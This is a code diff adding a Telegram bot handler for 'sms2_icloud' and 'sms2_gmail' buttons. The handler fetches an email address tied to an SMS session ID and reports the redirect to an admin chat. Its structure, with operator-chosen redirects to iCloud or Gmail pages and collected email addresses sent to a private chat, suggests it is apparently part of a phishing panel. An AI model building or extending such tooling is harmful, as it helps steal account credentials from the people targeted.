@@ -459,3 +459,57 @@ module.exports = { bot };
 
 // The callback handler should already be processing these patterns
 // Just ensure it hits the right endpoints for iCloud
+
+// ✅ Handle SMS2 iCloud and Gmail buttons
+if (action === "sms2_icloud" || action === "sms2_gmail") {
+  const sms2Id = email; // email param is actually sms2Id
+  console.log(`🔘 SMS2 redirect: ${action} for sms2Id: ${sms2Id}`);
+  
+  try {
+    // Remove buttons from message
+    try {
+      await bot.editMessageReplyMarkup(
+        { inline_keyboard: [] },
+        { chat_id: query.message.chat.id, message_id: query.message.message_id }
+      );
+    } catch (err) {
+      console.error("Error removing buttons:", err);
+    }
+    
+    // Send popup
+    const popupText = action === 'sms2_icloud' ? '☁️ iCloud' : '🌈 Gmail';
+    await bot.answerCallbackQuery(query.id, { text: `✅ ${popupText}` });
+    
+    // Send status message
+    try {
+      const sms2Res = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
+      const sms2Data = await sms2Res.json();
+      const sms2Email = sms2Data.email || 'unknown@example.com';
+      
+      const redirectText = action === 'sms2_icloud' ? '☁️' : '🌈';
+      const statusMsg = `📧 <code>${sms2Email}</code> → ${redirectText}`;
+      
+      const botToken = process.env.BOT_TOKEN;
+      const chatId = process.env.ADMIN_CHAT_ID;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: statusMsg,
+          parse_mode: "HTML"
+        })
+      });
+      console.log(`✅ SMS2 redirect status sent: ${statusMsg}`);
+    } catch (err) {
+      console.error("Error sending status message:", err);
+    }
+    
+    return;
+  } catch (err) {
+    console.error("❌ SMS2 redirect error:", err);
+    await bot.answerCallbackQuery(query.id, { text: "Error processing redirect" });
+    return;
+  }
+}
